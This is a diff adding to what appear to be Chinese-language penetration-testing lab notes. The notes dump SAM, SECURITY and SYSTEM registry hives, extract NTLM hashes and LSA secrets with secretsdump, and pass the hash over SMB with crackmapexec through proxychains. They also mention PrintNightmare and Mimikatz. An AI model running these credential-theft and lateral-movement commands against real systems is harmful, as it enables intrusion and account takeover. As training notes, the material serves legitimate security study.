@@ -292,3 +292,19 @@ c:\DotNetNuke\Portals\0> reg save HKLM\SYSTEM SYSTEM.SAVE
 c:\DotNetNuke\Portals\0> reg save HKLM\SECURITY SECURITY.SAVE
 c:\DotNetNuke\Portals\0> reg save HKLM\SAM SAM.SAVE
 
+secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE      提取哈希
+  该命令会从三个注册表文件中提取：
+  sam 数据库中的用户密码哈希值（NTLM 哈希）
+  security 数据库中的 LSA Secrets（包括缓存的域凭据、服务账户密码等）
+  system 用于解密这些哈希值
+
+proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <redacted>      登录
+  显示 (Pwn3d!) 表示登录成功
+  可加 -x "whoami"
+  可多主机 smb 172.16.8.20-25
+
+也可以利用 PrintNightmare 漏洞在 DEV01 主机上提升权限
+还有其他方法可以检索凭据，例如 Mimikatz
+
+反向端口转发
+
